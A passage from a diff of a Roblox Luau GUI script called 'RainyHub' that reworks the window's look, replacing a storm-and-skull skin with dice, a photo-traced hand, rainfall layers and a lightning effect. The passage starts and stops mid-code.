+if spot then
+pips[i].Position = UDim2.new(spot[1], 0, spot[2], 0)
+end
+end
+end
+setFace(value or 1)
+return die, setFace
+end
+function makeDraggable(frame, handle)
+handle = handle or frame
 local dragging = false
 local dragStart
 local startPos
 local dragInput
-frame.InputBegan:Connect(function(input)
-if _G.AceGuiLocked == true then return end
+handle.InputBegan:Connect(function(input)
+if _G.DiceGuiLocked == true then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
@@ -3303,13 +3741,13 @@ end
 end)
 end
 end)
-frame.InputChanged:Connect(function(input)
+handle.InputChanged:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 dragInput = input
 end
 end)
 UserInputService.InputChanged:Connect(function(input)
-if _G.AceGuiLocked == true then return end
+if _G.DiceGuiLocked == true then return end
 if input == dragInput and dragging then
 local delta = input.Position - dragStart
 frame.Position = UDim2.new(
@@ -3326,12 +3764,12 @@ Gui.Name = "RainyHub"
 Gui.ResetOnSpawn = false
 Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Gui.Parent = PlayerGui
-local FULL_MAIN_SIZE = UDim2.new(0, 560, 0, 580)
+local FULL_MAIN_SIZE = UDim2.new(0, 440, 0, 580)
 local Main = Instance.new("Frame")
 Main.Name = "Main"
 Main.AnchorPoint = Vector2.new(0, 0.5)
 Main.Size = FULL_MAIN_SIZE
-Main.Position = tableToUDim2(savedMainPositionTable, UDim2.new(0, 26, 0.5, 0))
+Main.Position = tableToUDim2(savedMainPositionTable, UDim2.new(0, 20, 0.5, 0))
 savedMainPositionTable = udim2ToTable(Main.Position)
 Main.BackgroundColor3 = COLORS.bg
 Main.BorderSizePixel = 0
@@ -3339,224 +3777,113 @@ Main.Active = true
 Main.ClipsDescendants = false
 Main.Parent = Gui
 corner(Main, 16)
-stroke(Main, RAIN.accent, 1.6, 0.15)
+stroke(Main, COLORS.accent, 1.6, 0.15)
 makeDraggable(Main)
 Main:GetPropertyChangedSignal("Position"):Connect(function()
 savedMainPositionTable = udim2ToTable(Main.Position)
 end)
--- ═══════════════════════════════════════════════════════════════
--- RAINY HUB SKIN — storm backdrop, rainfall and the skull sidebar.
--- Globals rather than locals: the main chunk is already close to Lua's
--- 200-local ceiling and the rest of this script leans on globals too.
--- ═══════════════════════════════════════════════════════════════
-RainyW, RainyH = 560, 580
-RainyRng = Random.new(tick())
-
--- Sizing is left to the script's own aceMainScale / "GUI Scale" stepper
--- in Settings; a second UIScale on Main would fight it.
-
--- ── storm sky ──────────────────────────────────────────────────────────
-RainySky = Instance.new("Frame")
-RainySky.Name = "StormSky"
-RainySky.BorderSizePixel = 0
-RainySky.Size = UDim2.new(1, 0, 1, 0)
-RainySky.BackgroundColor3 = Color3.fromRGB(10, 17, 34)
-RainySky.ZIndex = 1
-RainySky.Parent = Main
-corner(RainySky, 16)
+local MiniFrame = Instance.new("Frame")
+MiniFrame.Name = "MiniFrame"
+MiniFrame.AnchorPoint = Vector2.new(0, 0)
+MiniFrame.Size = UDim2.new(0, 46, 0, 46)
+local MINI_DEFAULT_POSITION = UDim2.new(0, 132, 0, 112)
+MiniFrame.Position = MINI_DEFAULT_POSITION
+savedMiniPositionTable = nil
+MiniFrame.BackgroundTransparency = 1
+MiniFrame.BorderSizePixel = 0
+MiniFrame.Visible = false
+MiniFrame.Active = true
+MiniFrame.ZIndex = 20
+MiniFrame.Parent = Gui
+-- The collapsed handle is a die rather than a labelled tab.
+local MiniDie, setMiniDieFace = makeDie(MiniFrame, 46, 6, false)
+MiniDie.Name = "MiniDie"
+MiniDie.Position = UDim2.new(0, 0, 0, 0)
+local MiniButton = Instance.new("TextButton")
+MiniButton.Name = "MiniButton"
+MiniButton.Size = UDim2.new(1, 0, 1, 0)
+MiniButton.BackgroundTransparency = 1
+MiniButton.Text = ""
+MiniButton.AutoButtonColor = false
+MiniButton.ZIndex = 25
+MiniButton.Parent = MiniFrame
+-- Fresh roll every time it appears.
+MiniFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+if MiniFrame.Visible then setMiniDieFace(math.random(1, 6)) end
+end)
 do
-local g = Instance.new("UIGradient")
-g.Color = ColorSequence.new(Color3.fromRGB(15, 26, 52), Color3.fromRGB(4, 7, 15))
-g.Rotation = 90
-g.Parent = RainySky
-end
-
-for i = 1, 5 do
-local band = Instance.new("Frame")
-band.Name = "CloudBand"
-band.BorderSizePixel = 0
-band.Size = UDim2.new(1.6, 0, 0, RainyRng:NextInteger(40, 90))
-band.Position = UDim2.new(0, -RainyRng:NextInteger(0, 200), 0, RainyRng:NextInteger(-20, RainyH - 60))
-band.BackgroundColor3 = Color3.fromRGB(28, 44, 84)
-band.BackgroundTransparency = RainyRng:NextNumber(0.86, 0.94)
-band.ZIndex = 1
-band.Parent = Main
-corner(band, 40)
-local drift = RainyRng:NextNumber(9, 20)
-local dir = (i % 2 == 0) and 1 or -1
-task.spawn(function()
-while band.Parent do
-local target = band.Position.X.Offset + dir * RainyRng:NextInteger(60, 140)
-tween(band, {Position = UDim2.new(band.Position.X.Scale, target, band.Position.Y.Scale, band.Position.Y.Offset)}, drift)
-task.wait(drift)
-dir = -dir
+local miniDragging = false
+local miniDragStart = nil
+local miniStartPos = nil
+local miniMoved = false
+local miniHeldInput = nil
+local DRAG_DEADZONE = 6
+MiniButton.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+miniDragging = true
+miniMoved = false
+miniHeldInput = input
+miniDragStart = input.Position
+miniStartPos = MiniFrame.Position
 end
 end)
+UserInputService.InputChanged:Connect(function(input)
+if not miniDragging then return end
+if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
+if not miniDragStart or not miniStartPos then return end
+local delta = input.Position - miniDragStart
+if math.abs(delta.X) > DRAG_DEADZONE or math.abs(delta.Y) > DRAG_DEADZONE then
+miniMoved = true
 end
-
--- ── rainfall ───────────────────────────────────────────────────────────
-_G.RainyRainOn = _G.RainyRainOn ~= false
-RAINY_DROPS, RAINY_SPEED, RAINY_TILT, RAINY_ALPHA = 78, 620, 13, 0.54
-
-function RainyMakeLayer(name, zindex)
-local layer = Instance.new("Frame")
-layer.Name = name
-layer.BorderSizePixel = 0
-layer.BackgroundTransparency = 1
-layer.Size = UDim2.new(1, 0, 1, 0)
-layer.ClipsDescendants = true
-layer.ZIndex = zindex
-layer.Parent = Main
-corner(layer, 16)
-return layer
-end
-
--- one field behind the panels, one in front, so the window reads as wet
-RainyBackLayer = RainyMakeLayer("Rainfall", 2)
-RainyFrontLayer = RainyMakeLayer("RainfallFront", 30)
-RainyDrops = {}
-
-function RainyResetDrop(d, above)
-d.x = RainyRng:NextNumber(-40, RainyW + 20)
-d.y = above and RainyRng:NextNumber(-260, -8) or RainyRng:NextNumber(-RainyH, RainyH)
-d.vy = RAINY_SPEED * RainyRng:NextNumber(0.75, 1.35) * (d.front and 2.1 or 1)
-d.vx = math.tan(math.rad(RAINY_TILT)) * d.vy
-d.frame.Size = UDim2.new(0, d.front and 2.6 or RainyRng:NextNumber(0.9, 2.1), 0, RainyRng:NextInteger(d.front and 34 or 12, d.front and 64 or 30))
-d.frame.Rotation = RAINY_TILT + (d.front and 1 or 0)
-d.frame.BackgroundTransparency = (d.front and 0.78 or RAINY_ALPHA) + RainyRng:NextNumber(-0.08, 0.14)
-end
-
-function RainyBuildRain()
-for _, d in ipairs(RainyDrops) do
-if d.frame then d.frame:Destroy() end
-end
-RainyDrops = {}
-for i = 1, RAINY_DROPS + 18 do
-local front = i > RAINY_DROPS
-local f = Instance.new("Frame")
-f.BorderSizePixel = 0
-f.BackgroundColor3 = RAIN.drop
-f.AnchorPoint = Vector2.new(0.5, 0)
-f.ZIndex = front and 31 or 3
-f.Parent = front and RainyFrontLayer or RainyBackLayer
-corner(f, 2)
-local d = {frame = f, front = front}
-RainyResetDrop(d, false)
-f.Position = UDim2.new(0, d.x, 0, d.y)
-table.insert(RainyDrops, d)
-end
-end
-RainyBuildRain()
-
-function RainySplash(x, y)
-local r = Instance.new("Frame")
-r.BorderSizePixel = 0
-r.BackgroundTransparency = 1
-r.AnchorPoint = Vector2.new(0.5, 0.5)
-r.Size = UDim2.new(0, 3, 0, 2)
-r.Position = UDim2.new(0, x, 0, y)
-r.ZIndex = 3
-r.Parent = RainyBackLayer
-corner(r, 999)
-local rs = stroke(r, RAIN.accentGlow, 1, 0.35)
-tween(r, {Size = UDim2.new(0, RainyRng:NextInteger(18, 34), 0, RainyRng:NextInteger(5, 10))}, 0.45)
-tween(rs, {Transparency = 1}, 0.45)
-task.delay(0.5, function() if r and r.Parent then r:Destroy() end end)
-end
-
-RainySplashClock = 0
-RunService.RenderStepped:Connect(function(dt)
-if not _G.RainyRainOn or not Main.Visible then return end
-dt = math.min(dt, 0.05)
-for _, d in ipairs(RainyDrops) do
-d.y = d.y + d.vy * dt
-d.x = d.x + d.vx * dt
-if d.y > RainyH + 30 or d.x > RainyW + 60 then
-RainyResetDrop(d, true)
-end
-d.frame.Position = UDim2.new(0, d.x, 0, d.y)
-end
-RainySplashClock = RainySplashClock + dt
-if RainySplashClock >= 0.3 then
-RainySplashClock = 0
-RainySplash(RainyRng:NextInteger(12, RainyW - 12), RainyRng:NextInteger(RainyH - 46, RainyH - 8))
-end
+MiniFrame.Position = UDim2.new(
+miniStartPos.X.Scale,
+miniStartPos.X.Offset + delta.X,
+miniStartPos.Y.Scale,
+miniStartPos.Y.Offset + delta.Y
+)
 end)
-
--- wet glass pooling along the bottom edge
-do
-local sheen = Instance.new("Frame")
-sheen.Name = "Sheen"
-sheen.BorderSizePixel = 0
-sheen.Size = UDim2.new(1, 0, 0, 120)
-sheen.Position = UDim2.new(0, 0, 1, -120)
-sheen.BackgroundColor3 = Color3.fromRGB(20, 44, 92)
-sheen.BackgroundTransparency = 0.82
-sheen.ZIndex = 2
-sheen.Parent = Main
-local g = Instance.new("UIGradient")
-g.Color = ColorSequence.new(Color3.fromRGB(40, 84, 160), Color3.fromRGB(6, 12, 26))
-g.Rotation = 90
-g.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0.55)})
-g.Parent = sheen
+UserInputService.InputEnded:Connect(function(input)
+if input ~= miniHeldInput then return end
+local wasDrag = miniMoved
+miniDragging = false
+miniHeldInput = nil
+miniDragStart = nil
+miniStartPos = nil
+if wasDrag then
+return
 end
-
--- ── open animation ─────────────────────────────────────────────────────
--- Reopening rises from slightly below and under-scale, then settles.
--- aceMainScale is built later in the script, so it is looked up on the
--- fly rather than captured.
-function RainyOpenAnimation()
-local scaler = Main:FindFirstChild("AceMainScale")
-local target = scaler and scaler.Scale or 1
-local home = Main.Position
 Main.Visible = true
-Main.Position = UDim2.new(home.X.Scale, home.X.Offset, home.Y.Scale, home.Y.Offset + 26)
-if scaler then scaler.Scale = target * 0.92 end
-TweenService:Create(Main, TweenInfo.new(0.34, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
-{Position = home}):Play()
-if scaler then
-TweenService:Create(scaler, TweenInfo.new(0.34, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-{Scale = target}):Play()
-end
+MiniFrame.Visible = false
+Main.Size = FULL_MAIN_SIZE
+savedMainPositionTable = udim2ToTable(Main.Position)
+end)
 end
 
--- ── sidebar ────────────────────────────────────────────────────────────
-RainySidebar = Instance.new("Frame")
-RainySidebar.Name = "Sidebar"
-RainySidebar.BorderSizePixel = 0
-RainySidebar.Size = UDim2.new(0, SIDE_W, 1, -24)
-RainySidebar.Position = UDim2.new(0, 12, 0, 12)
-RainySidebar.BackgroundColor3 = RAIN.sidebar
-RainySidebar.BackgroundTransparency = 0.12
-RainySidebar.ClipsDescendants = true
-RainySidebar.ZIndex = 2
-RainySidebar.Parent = Main
-corner(RainySidebar, 13)
-stroke(RainySidebar, COLORS.stroke, 1.2, 0.4)
-
+-- ═══════════════════════════════════════════════════════════════
+-- BACKDROP — faded dice scattered behind the panels. Sits low in the
+-- stack so the translucent sidebar and content pane read over the top.
+-- ═══════════════════════════════════════════════════════════════
+-- Scoped so the panel's furniture does not eat main-chunk local
+-- slots; Luau caps a function at 200 of them and this file is close.
 do
-local wash = Instance.new("Frame")
-wash.BorderSizePixel = 0
-wash.Size = UDim2.new(1, 0, 1, 0)
-wash.BackgroundColor3 = Color3.fromRGB(11, 22, 46)
-wash.BackgroundTransparency = 0.25
-wash.ZIndex = 2
-wash.Parent = RainySidebar
-corner(wash, 13)
-local g = Instance.new("UIGradient")
-g.Color = ColorSequence.new(Color3.fromRGB(18, 38, 78), Color3.fromRGB(4, 8, 18))
-g.Rotation = 90
-g.Parent = wash
-end
-
--- ── sidebar artwork: the hand, traced from a photo ─────────────────────
--- Roblox UI has no path or polygon primitive, so the outline is stored as
--- scanline spans lifted off the source image: one row per entry as
--- {y, x1, x2, and five brightness samples across the span}. Each span
--- becomes a Frame carrying a five-stop gradient, so the silhouette is the
--- real one and the shading is the real light on it, remapped to blue.
--- 221 spans on a 176x214 grid.
+local DiceBackdrop = Instance.new("Frame")
+DiceBackdrop.Name = "DiceBackdrop"
+DiceBackdrop.BackgroundTransparency = 1
+DiceBackdrop.Size = UDim2.new(1, 0, 1, 0)
+DiceBackdrop.Position = UDim2.new(0, 0, 0, 0)
+DiceBackdrop.ClipsDescendants = true
+DiceBackdrop.ZIndex = 2
+DiceBackdrop.Parent = Main
+corner(DiceBackdrop, 14)
+local backdropDieSetters = {}
 do
+-- ── the hand, traced from a photo ──────────────────────────────────
+-- Roblox UI has no path or polygon primitive, so the outline is stored
+-- as scanline spans lifted off the source image: {y, x1, x2} plus five
+-- brightness samples across the span. Each span becomes a Frame with a
+-- five-stop gradient, so the silhouette is the real one and the shading
+-- is the real light on it, remapped to blue. A fattened copy sits behind
+-- it as the glow, and both breathe together.
 local HAND_ROWS = {
 {0,97,102,230,212,198,212,233},
 {2,94,105,230,194,184,216,255},
@@ -3781,47 +4108,63 @@ local HAND_ROWS = {
 {212,31,136,7,99,191,191,155},
 }
 
-local DEEP = Color3.fromRGB(14, 36, 80)
-local MID = Color3.fromRGB(46, 102, 180)
-local LIGHT = Color3.fromRGB(176, 216, 255)
 local function ramp(v)
 local t = v / 255
-if t < 0.55 then return DEEP:Lerp(MID, t / 0.55) end
-return MID:Lerp(LIGHT, (t - 0.55) / 0.45)
+if t < 0.55 then return RAIN.deep:Lerp(RAIN.mid, t / 0.55) end
+return RAIN.mid:Lerp(RAIN.light, (t - 0.55) / 0.45)
 end
 
-local stage = Instance.new("Frame")
-stage.Name = "HandArt"
-stage.BackgroundTransparency = 1
-stage.BorderSizePixel = 0
-stage.Size = UDim2.new(0, 176, 0, 214)
-stage.Position = UDim2.new(0, 15, 0, 68)
-stage.ZIndex = 4
-stage.Parent = RainySidebar
+local function layer(name, z, transparency)
+local ok, l = pcall(function() return Instance.new("CanvasGroup") end)
+if not ok or not l then l = Instance.new("Frame") end
+l.Name = name
+l.BackgroundTransparency = 1
+l.BorderSizePixel = 0
+l.Size = UDim2.new(1, 0, 1, 0)
+l.ZIndex = z
+l.Parent = HandStage
+if l:IsA("CanvasGroup") then l.GroupTransparency = transparency end
+return l, l:IsA("CanvasGroup")
+end
 
-local ok, body = pcall(function() return Instance.new("CanvasGroup") end)
-if not ok or not body then body = Instance.new("Frame") end
-body.Name = "HandBody"
-body.BackgroundTransparency = 1
-body.BorderSizePixel = 0
-body.Size = UDim2.new(1, 0, 1, 0)
-body.ZIndex = 4
-body.Parent = stage
-local grouped = body:IsA("CanvasGroup")
-if grouped then body.GroupTransparency = 0.18 end
-local alpha = grouped and 0 or 0.18
-RainyHandArt = body
+HandStage = Instance.new("Frame")
+HandStage.Name = "HandArt"
+HandStage.BackgroundTransparency = 1
+HandStage.BorderSizePixel = 0
+HandStage.AnchorPoint = Vector2.new(0.5, 0.5)
+HandStage.Size = UDim2.new(0, 176, 0, 214)
+HandStage.Position = UDim2.new(0.5, 0, 0.5, 0)
+HandStage.ZIndex = 2
+HandStage.Parent = DiceBackdrop
+local handScale = Instance.new("UIScale")
+handScale.Scale = 1.85
+handScale.Parent = HandStage
+
+local glowLayer, glowGrouped = layer("HandGlow", 2, 0.62)
+local bodyLayer, bodyGrouped = layer("HandBody", 3, 0.34)
+RainyHandGlow = glowGrouped and glowLayer or nil
 
 for _, r in ipairs(HAND_ROWS) do
 local y, x1, x2 = r[1], r[2], r[3]
+-- glow: the same span, inflated, in one flat bright colour
+local halo = Instance.new("Frame")
+halo.BorderSizePixel = 0
+halo.Size = UDim2.new(0, x2 - x1 + 7, 0, 9)
+halo.Position = UDim2.new(0, x1 - 3, 0, y - 3)
+halo.BackgroundColor3 = RAIN.glow
+halo.BackgroundTransparency = glowGrouped and 0 or 0.62
+halo.ZIndex = 2
+halo.Parent = glowLayer
+Instance.new("UICorner", halo).CornerRadius = UDim.new(0, 4)
+
 local strip = Instance.new("Frame")
 strip.BorderSizePixel = 0
 strip.Size = UDim2.new(0, x2 - x1 + 1, 0, 3)
 strip.Position = UDim2.new(0, x1, 0, y)
-strip.BackgroundColor3 = MID
-strip.BackgroundTransparency = alpha
-strip.ZIndex = 5
-strip.Parent = body
+strip.BackgroundColor3 = RAIN.mid
+strip.BackgroundTransparency = bodyGrouped and 0 or 0.34
+strip.ZIndex = 3
+strip.Parent = bodyLayer
 local g = Instance.new("UIGradient")
 g.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, ramp(r[4])),
@@ -3832,417 +4175,881 @@ ColorSequenceKeypoint.new(1, ramp(r[8])),
 })
 g.Parent = strip
 end
-end
 
--- vignettes so the title and tabs stay readable over the artwork
-do
-local top = Instance.new("Frame")
-top.BorderSizePixel = 0
-top.Size = UDim2.new(1, 0, 0, 150)
-top.BackgroundColor3 = Color3.fromRGB(3, 6, 14)
-top.BackgroundTransparency = 0.15
-top.ZIndex = 3
-top.Parent = RainySidebar
-local tg = Instance.new("UIGradient")
-tg.Rotation = 90
-tg.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.05), NumberSequenceKeypoint.new(1, 1)})
-tg.Parent = top
-
-local bottom = Instance.new("Frame")
-bottom.BorderSizePixel = 0
-bottom.Size = UDim2.new(1, 0, 0, 260)
-bottom.Position = UDim2.new(0, 0, 1, -260)
-bottom.BackgroundColor3 = Color3.fromRGB(3, 6, 14)
-bottom.BackgroundTransparency = 0.3
-bottom.ZIndex = 3
-bottom.Parent = RainySidebar
-local bg = Instance.new("UIGradient")
-bg.Rotation = 90
-bg.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0.2)})
-bg.Parent = bottom
-end
-
--- divider between the sidebar and the settings column
-do
-local div = Instance.new("Frame")
-div.BorderSizePixel = 0
-div.Size = UDim2.new(0, 1, 1, -60)
-div.Position = UDim2.new(0, SIDE_W + 19, 0, 30)
-div.BackgroundColor3 = RAIN.accent
-div.BackgroundTransparency = 0.55
-div.ZIndex = 2
-div.Parent = Main
-local g = Instance.new("UIGradient")
-g.Rotation = 90
-g.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0.2)})
-g.Parent = div
-end
-
--- connection pill
-do
-local pill = Instance.new("Frame")
-pill.Name = "Status"
-pill.BorderSizePixel = 0
-pill.Size = UDim2.new(1, -28, 0, 38)
-pill.Position = UDim2.new(0, 14, 1, -52)
-pill.BackgroundColor3 = COLORS.row
-pill.BackgroundTransparency = 0.22
-pill.ZIndex = 6
-pill.Parent = RainySidebar
-corner(pill, 9)
-stroke(pill, COLORS.stroke, 1.1, 0.45)
-
-local dot = Instance.new("Frame")
-dot.BorderSizePixel = 0
-dot.Size = UDim2.new(0, 9, 0, 9)
-dot.Position = UDim2.new(0, 14, 0.5, -4)
-dot.BackgroundColor3 = RAIN.good
-dot.ZIndex = 7
-dot.Parent = pill
-corner(dot, 999)
-
-local halo = Instance.new("Frame")
-halo.BorderSizePixel = 0
-halo.AnchorPoint = Vector2.new(0.5, 0.5)
-halo.Size = UDim2.new(1, 8, 1, 8)
-halo.Position = UDim2.new(0.5, 0, 0.5, 0)
-halo.BackgroundColor3 = RAIN.good
-halo.BackgroundTransparency = 0.6
-halo.ZIndex = 6
-halo.Parent = dot
-corner(halo, 999)
-
-local label = Instance.new("TextLabel")
-label.BackgroundTransparency = 1
-label.Text = "Connected"
-label.Size = UDim2.new(1, -34, 1, 0)
-label.Position = UDim2.new(0, 32, 0, 0)
-label.TextSize = 14
-label.TextColor3 = COLORS.white
-label.Font = Enum.Font.GothamSemibold
-label.TextXAlignment = Enum.TextXAlignment.Left
-label.ZIndex = 7
-label.Parent = pill
-
+-- the glow breathes
+if RainyHandGlow then
 task.spawn(function()
-while halo.Parent do
-tween(halo, {BackgroundTransparency = 0.9, Size = UDim2.new(1, 16, 1, 16)}, 1.1)
-task.wait(1.15)
-tween(halo, {BackgroundTransparency = 0.55, Size = UDim2.new(1, 6, 1, 6)}, 1.1)
-task.wait(1.15)
+local up = true
+while RainyHandGlow and RainyHandGlow.Parent do
+TweenService:Create(RainyHandGlow, TweenInfo.new(2, Enum.EasingStyle.Sine),
+{GroupTransparency = up and 0.44 or 0.7}):Play()
+up = not up
+task.wait(2.1)
 end
 end)
 end
+end
+-- nothing to re-roll now the dice are gone
+function rollBackdropDice() end
+end
 
--- ── FPS / ping readout, driven into the header label ───────────────────
-task.spawn(function()
-local frames, elapsed = 0, 0
+
+-- ═══════════════════════════════════════════════════════════════
+-- RAINFALL — two fields, one behind the panels and one in front, so
+-- the window reads as wet without drowning the rows.
+-- ═══════════════════════════════════════════════════════════════
+do
+local rng = Random.new(tick())
+local W, H = 440, 580
+local function field(name, z, count, speed, thickness, alpha)
+local layer = Instance.new("Frame")
+layer.Name = name
+layer.BackgroundTransparency = 1
+layer.BorderSizePixel = 0
+layer.Size = UDim2.new(1, 0, 1, 0)
+layer.ClipsDescendants = true
+layer.ZIndex = z
+layer.Parent = Main
+corner(layer, 16)
+local drops = {}
+for _ = 1, count do
+local f = Instance.new("Frame")
+f.BorderSizePixel = 0
+f.BackgroundColor3 = RAIN.drop
+f.AnchorPoint = Vector2.new(0.5, 0)
+f.Size = UDim2.new(0, thickness, 0, rng:NextInteger(14, 34))
+f.Rotation = 13
+f.BackgroundTransparency = alpha
+f.ZIndex = z
+f.Parent = layer
+corner(f, 2)
+table.insert(drops, {frame = f, x = rng:NextNumber(-30, W), y = rng:NextNumber(-H, H),
+vy = speed * rng:NextNumber(0.75, 1.35)})
+end
+return drops
+end
+local back = field("Rainfall", 2, 70, 620, 1.6, 0.55)
+local front = field("RainfallFront", 40, 16, 1300, 2.6, 0.8)
 RunService.RenderStepped:Connect(function(dt)
-frames = frames + 1
-elapsed = elapsed + dt
-if elapsed >= 0.5 then
-local fps = math.floor(frames / elapsed + 0.5)
-frames, elapsed = 0, 0
-local ping = 0
-pcall(function()
-local v = Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
-ping = math.floor((tonumber(string.match(v, "[%d%.]+")) or 0) + 0.5)
-end)
-if RainyStatLabel and RainyStatLabel.Parent then
-RainyStatLabel.Text = string.format("FPS: %d | PING: %dms", fps, ping)
+if not Main.Visible then return end
+dt = math.min(dt, 0.05)
+for _, set in ipairs({back, front}) do
+for _, d in ipairs(set) do
+d.y = d.y + d.vy * dt
+d.x = d.x + d.vy * 0.23 * dt
+if d.y > H + 30 or d.x > W + 40 then
+d.y = rng:NextNumber(-200, -20)
+d.x = rng:NextNumber(-40, W)
+end
+d.frame.Position = UDim2.new(0, d.x, 0, d.y)
 end
 end
 end)
-end)
+-- wet glass pooling along the foot of the window
+local sheen = Instance.new("Frame")
+sheen.Name = "Sheen"
+sheen.BorderSizePixel = 0
+sheen.Size = UDim2.new(1, 0, 0, 120)
+sheen.Position = UDim2.new(0, 0, 1, -120)
+sheen.BackgroundColor3 = Color3.fromRGB(20, 44, 92)
+sheen.BackgroundTransparency = 0.82
+sheen.ZIndex = 2
+sheen.Parent = Main
+local sg = Instance.new("UIGradient")
+sg.Rotation = 90
+sg.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0.55)})
+sg.Parent = sheen
+end
 
-local MiniFrame = Instance.new("Frame")
-MiniFrame.Name = "MiniFrame"
-MiniFrame.AnchorPoint = Vector2.new(0, 0)
-MiniFrame.Size = UDim2.new(0, 96, 0, 40)
-local MINI_DEFAULT_POSITION = UDim2.new(0, 132, 0, 112)
-MiniFrame.Position = MINI_DEFAULT_POSITION
-savedMiniPositionTable = nil
-MiniFrame.BackgroundColor3 = Color3.fromRGB(6, 11, 22)
-MiniFrame.BackgroundTransparency = 0
-MiniFrame.BorderSizePixel = 0
-MiniFrame.Visible = false
-MiniFrame.Active = true
-MiniFrame.ZIndex = 20
-MiniFrame.Parent = Gui
-corner(MiniFrame, 12)
-stroke(MiniFrame, RAIN.accentGlow, 1.6, 0.1)
-local MiniButton = Instance.new("TextButton")
-MiniButton.Name = "MiniButton"
-MiniButton.Size = UDim2.new(1, 0, 1, 0)
-MiniButton.BackgroundTransparency = 1
-MiniButton.Text = "RAINY  \u{25BC}"
-MiniButton.TextColor3 = Color3.fromRGB(240, 246, 255)
-MiniButton.TextStrokeColor3 = Color3.fromRGB(0, 6, 22)
-MiniButton.TextStrokeTransparency = 0.35
-MiniButton.TextSize = 14
-MiniButton.Font = Enum.Font.GothamBlack
-MiniButton.AutoButtonColor = false
-MiniButton.ZIndex = 21
-MiniButton.Parent = MiniFrame
-local MiniShade = Instance.new("Frame")
-MiniShade.Name = "MiniShade"
-MiniShade.Size = UDim2.new(1, -4, 1, -4)
-MiniShade.Position = UDim2.new(0, 2, 0, 2)
-MiniShade.BackgroundColor3 = Color3.fromRGB(10, 20, 40)
-MiniShade.BackgroundTransparency = 0.12
-MiniShade.BorderSizePixel = 0
-MiniShade.ZIndex = 20
-MiniShade.Parent = MiniFrame
-corner(MiniShade, 10)
+-- ═══════════════════════════════════════════════════════════════
 do
-local miniDragging = false
-local miniDragStart = nil
-local miniStartPos = nil
-local miniMoved = false
-local miniHeldInput = nil
-local DRAG_DEADZONE = 6
-MiniButton.InputBegan:Connect(function(input)
-if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-miniDragging = true
-miniMoved = false
-miniHeldInput = input
-miniDragStart = input.Position
-miniStartPos = MiniFrame.Position
+	local LIGHTNING_COLORS = {
+		primary   = Color3.fromRGB(226, 226, 230),
+		core      = Color3.fromRGB(255, 255, 255),
+		glow      = Color3.fromRGB(150, 150, 156),
+		branch    = Color3.fromRGB(190, 190, 196),
+		spark     = Color3.fromRGB(238, 238, 242),
+		flash     = Color3.fromRGB(205, 205, 210),
+		ambient   = Color3.fromRGB(120, 120, 126),
+	}
+
+	local LightningContainer = Instance.new("Frame")
+	LightningContainer.Name = "LightningFX"
+	LightningContainer.BackgroundTransparency = 1
+	LightningContainer.Size = UDim2.new(1, 0, 1, 0)
+	LightningContainer.Position = UDim2.new(0, 0, 0, 0)
+	LightningContainer.ClipsDescendants = true
+	LightningContainer.ZIndex = 2
+	LightningContainer.Parent = Main
+	corner(LightningContainer, 14)
+
+	local FlashOverlay = Instance.new("Frame")
+	FlashOverlay.Name = "FlashOverlay"
+	FlashOverlay.BackgroundColor3 = LIGHTNING_COLORS.flash
+	FlashOverlay.BackgroundTransparency = 1
+	FlashOverlay.Size = UDim2.new(1, 0, 1, 0)
+	FlashOverlay.ZIndex = 2
+	FlashOverlay.Parent = LightningContainer
+	corner(FlashOverlay, 14)
+
+	local AmbientGlow = Instance.new("Frame")
+	AmbientGlow.Name = "AmbientGlow"
+	AmbientGlow.BackgroundColor3 = LIGHTNING_COLORS.ambient
+	AmbientGlow.BackgroundTransparency = 1
+	AmbientGlow.Size = UDim2.new(1, 0, 1, 0)
+	AmbientGlow.ZIndex = 2
+	AmbientGlow.Parent = LightningContainer
+	corner(AmbientGlow, 14)
+
+	local GlowGradient = Instance.new("UIGradient")
+	GlowGradient.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 120, 126)),
+		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(58, 58, 62)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 120, 126)),
+	})
+	GlowGradient.Transparency = NumberSequence.new({
+		NumberSequenceKeypoint.new(0, 0.7),
+		NumberSequenceKeypoint.new(0.5, 0.3),
+		NumberSequenceKeypoint.new(1, 0.7),
+	})
+	GlowGradient.Parent = AmbientGlow
+
+	local rng = Random.new(tick())
+
+	local function createSegment(parent, x1, y1, x2, y2, thickness, color, transparency, zindex)
+		local dx = x2 - x1
+		local dy = y2 - y1
+		local length = math.sqrt(dx * dx + dy * dy)
+		local angle = math.atan2(dy, dx)
+
+		local seg = Instance.new("Frame")
+		seg.BackgroundColor3 = color or LIGHTNING_COLORS.primary
+		seg.BackgroundTransparency = transparency or 0
+		seg.BorderSizePixel = 0
+		seg.Size = UDim2.new(0, math.max(length, 1), 0, thickness or 2)
+		seg.Position = UDim2.new(0, x1, 0, y1)
+		seg.AnchorPoint = Vector2.new(0, 0.5)
+		seg.Rotation = math.deg(angle)
+		seg.ZIndex = zindex or 3
+		seg.Parent = parent
+
+		local segGlow = Instance.new("Frame")
+		segGlow.BackgroundColor3 = LIGHTNING_COLORS.glow
+		segGlow.BackgroundTransparency = 0.5
+		segGlow.BorderSizePixel = 0
